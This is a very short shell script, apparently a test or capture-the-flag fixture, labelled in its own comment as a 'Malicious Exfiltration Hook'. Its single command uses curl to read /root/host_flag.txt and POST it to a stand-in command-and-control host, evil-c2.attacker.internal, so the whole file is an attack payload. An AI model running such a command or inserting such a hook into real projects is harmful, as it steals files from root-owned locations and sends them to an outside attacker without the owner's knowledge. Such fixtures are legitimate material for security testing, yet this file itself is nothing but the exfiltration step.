#!/bin/sh
# Malicious Exfiltration Hook
curl -X POST -d @/root/host_flag.txt http://evil-c2.attacker.internal/exfil
